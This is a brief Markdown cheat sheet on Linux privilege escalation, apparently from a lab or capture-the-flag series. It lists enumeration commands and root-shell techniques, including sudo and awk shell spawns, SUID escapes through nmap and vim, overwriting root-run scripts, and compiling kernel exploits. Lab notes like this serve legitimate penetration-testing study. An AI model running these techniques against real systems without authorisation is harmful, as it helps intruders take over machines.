## 🛡️ Privilege Escalation (Machines 101–110)

### Enumeration

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ps aux
cat /etc/crontab
```

### Exploitation Techniques

- **Sudo Misconfigurations**
  ```bash
  sudo <binary>  # If NOPASSWD is set
  sudo awk 'BEGIN {system("/bin/bash")}'
  ```

- **SUID Binaries**
  ```bash
  /usr/bin/nmap --interactive
  /usr/bin/vim -c ':!/bin/sh'
  ```

- **Capabilities Abuse**
  ```bash
  getcap /path/to/file
  # Exploit binary with cap_sys_admin or cap_setuid
  ```

- **Cron Jobs**
  ```bash
  cat /etc/crontab
  ls -la /etc/cron.*
  ```

- **Writable Scripts Executed by Root**
  ```bash
  echo '/bin/bash' > /usr/local/bin/runme.sh
  chmod +x /usr/local/bin/runme.sh
  ```

- **Kernel Exploits**
  ```bash
  uname -r
  searchsploit linux kernel 4.4
  gcc exploit.c -o exploit && ./exploit
  ```

### Common Escalation Paths Identified

- Writable cron jobs and systemd services
- Sudo permission on restricted binaries like `less`, `awk`, `find`
- Capabilities set on Python and Bash binaries
- SUID binaries: unusual or custom programs owned by root
- Enumeration revealing credentials in backup/config files

